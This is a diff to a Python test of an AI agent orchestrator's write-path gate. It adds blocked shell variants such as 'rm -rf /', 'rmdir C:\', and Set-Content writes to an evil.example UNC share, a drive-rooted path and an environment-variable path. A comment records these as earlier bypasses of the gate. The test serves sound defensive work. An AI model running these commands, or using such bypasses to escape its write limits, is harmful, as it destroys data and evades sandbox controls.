@@ -99,7 +99,8 @@ def test_w7_c01_integration() -> None:
     # Positional-path variants that used to slip past the write-path gate:
     # the "-Content" scrub bug, executable here-strings, Clear-Content, and
     # environment-variable paths (all confirmed P1 bypasses pre-fix).
-    for variant in (
+    os.environ["RXY_W7_变量"] = r"C:\Windows\Temp"
+    variants = (
         f'Add-Content "{PAYLOAD_FILE}" "pwned"',
         f'Set-Content "{PAYLOAD_FILE}" "pwned"',
         f'powershell -c "Set-Content \\"{PAYLOAD_FILE}\\" \\"pwned\\""',
@@ -126,7 +127,12 @@ def test_w7_c01_integration() -> None:
         "mkdir /opt/rxy_w7c01_dir",
         "rm -rf /",
         "rmdir C:\\",
-    ):
+        # UNC shares, current-drive-rooted paths, and non-ASCII env names.
+        "Set-Content \\\\evil.example\\share\\rxy_w7c01_pwned.txt pwned",
+        "Set-Content \\Windows\\rxy_w7c01_pwned.txt pwned",
+        'Set-Content "$env:RXY_W7_变量\\rxy_w7c01_pwned.txt" pwned',
+    )
+    for variant in variants:
         blocked = asyncio.run(
             orchestrator.execute_tool(
                 "bash",
@@ -159,8 +165,18 @@ def test_w7_c01_integration() -> None:
         )
     finally:
         os.environ.pop("RXY_W7_WORK", None)
+        os.environ.pop("RXY_W7_变量", None)
     assert not find_bash_disallowed_write_paths("echo x > /dev/null", config)
     assert not find_bash_disallowed_write_paths("echo x 2>/dev/null", config)
+    # Relative targets keep working: '/', '\\', '~' mid-token are not roots.
+    for safe in (
+        "Set-Content ./inside.txt x",
+        "Set-Content config/settings.json x",
+        "cp ./a.txt ./b.txt",
+        "Set-Content dir\\sub\\file.txt x",
+        "Set-Content a~b.txt x",
+    ):
+        assert not find_bash_disallowed_write_paths(safe, config), safe
 
     unknown = asyncio.run(
         orchestrator.execute_tool(
